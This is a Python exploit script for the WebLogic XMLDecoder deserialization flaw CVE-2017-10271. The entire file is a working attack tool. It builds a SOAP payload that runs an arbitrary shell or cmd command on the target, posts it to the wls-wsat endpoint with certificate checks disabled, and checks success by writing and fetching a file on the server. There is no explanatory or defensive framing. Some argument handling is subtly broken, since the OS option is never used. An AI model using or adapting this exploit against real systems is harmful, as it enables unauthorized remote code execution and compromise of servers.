#!/usr/bin/python3
# pylint: disable=invalid-name, line-too-long, import-error, no-member, missing-docstring, broad-except

import argparse
import sys

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def payload_command(command_in, os="linux"):
    html_escape_table = {
        "&": "&amp;",
        '"': "&quot;",
        "'": "&apos;",
        ">": "&gt;",
        "<": "&lt;",
    }
    command_filtered = "<string>" + \
        "".join(html_escape_table.get(c, c) for c in command_in)+"</string>"
    payload_1 = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"> \n" \
                "   <soapenv:Header> " \
                "       <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"> \n" \
                "           <java version=\"1.8.0_151\" class=\"java.beans.XMLDecoder\"> \n" \
                "               <void class=\"java.lang.ProcessBuilder\"> \n" \
                "                  <array class=\"java.lang.String\" length=\"3\">" \
                "                      <void index = \"0\">                       " \
                "                          <string>sh</string>                 " \
                "                      </void>                                    " \
                "                      <void index = \"1\">                       " \
                "                          <string>-c</string>                  " \
                "                      </void>                                    " \
                "                      <void index = \"2\">                       " \
                + command_filtered + \
                "                      </void>                                    " \
                "                  </array>" \
                "                  <void method=\"start\"/>" \
                "                  </void>" \
                "            </java>" \
                "        </work:WorkContext>" \
                "   </soapenv:Header>" \
                "   <soapenv:Body/>" \
                "</soapenv:Envelope>"

    if os != "linux":
        payload_1 = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"> \n" \
                    "   <soapenv:Header> " \
                    "       <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"> \n" \
                    "           <java version=\"1.8.0_151\" class=\"java.beans.XMLDecoder\"> \n" \
                    "               <void class=\"java.lang.ProcessBuilder\"> \n" \
                    "                  <array class=\"java.lang.String\" length=\"3\">" \
                    "                      <void index = \"0\">                       " \
                    "                          <string>cmd</string>                 " \
                    "                      </void>                                    " \
                    "                      <void index = \"1\">                       " \
                    "                          <string>/c</string>                  " \
                    "                      </void>                                    " \
                    "                      <void index = \"2\">                       " \
                    + command_filtered + \
                    "                      </void>                                    " \
                    "                  </array>" \
                    "                  <void method=\"start\"/>" \
                    "                  </void>" \
                    "            </java>" \
                    "        </work:WorkContext>" \
                    "   </soapenv:Header>" \
                    "   <soapenv:Body/>" \
                    "</soapenv:Envelope>"

    return payload_1


def do_post(urlin, command_in):
    payload_url = urlin + "/wls-wsat/CoordinatorPortType"
    payload_header = {'content-type': 'text/xml'}
    try:
        result = requests.post(payload_url, payload_command(
            command_in), headers=payload_header, verify=False)
    except requests.RequestException as exc:
        print(f"error: {exc}")

        return False
    except KeyboardInterrupt:
        return False
    except BaseException as exc:
        print(f"error: {exc}")

        return False

    if result.status_code == 500:

        return True

    return False


parser = argparse.ArgumentParser(description='weblogic_cve-2017-10271')
parser.add_argument('-c', type=str, required=True,
                    help='command to execute on the target')
parser.add_argument('-t', type=str, required=True,
                    help='target url')
parser.add_argument('-os', type=str, required=True,
                    help='target os <linux/win>')

args = parser.parse_args()

try:
    command = args.c
    url_in = args.t

    if ':' not in args.t:
        url_in = url_in + ":7001"

    if "http://" not in url_in:
        url_in = "http://" + args.t

    if do_post(url_in, command):
        if do_post(url_in, "touch ./servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/weblogic-amvssdefrew.txt"):
            try:
                resp = requests.get(
                    f"{url_in}/bea_wls_internal/weblogic-amvssdefrew.txt")
            except BaseException:
                pass

            if resp.status_code == 200:
                print(f"\n[+] Success: {url_in}\n")
        sys.exit(0)

except (KeyboardInterrupt, EOFError, SystemExit):
    pass

sys.exit(1)
